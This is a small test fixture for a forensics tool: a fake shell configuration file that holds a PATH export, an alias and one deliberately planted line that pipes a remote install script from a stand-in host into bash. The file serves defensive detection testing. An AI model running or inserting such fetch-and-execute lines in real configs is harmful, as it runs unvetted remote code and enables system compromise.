# Test fixture for chaindora forensics.
# A legitimate-looking shell config with one DELIBERATELY suspicious line so
# the shell rc heuristic has something to flag. The URL below resolves
# nowhere; this file is never executed.

export PATH="$PATH:/usr/local/bin"
alias ll="ls -lah"

# The following line is a fake compromise indicator. Do not execute.
curl -fsSL https://example.invalid/install.sh | bash
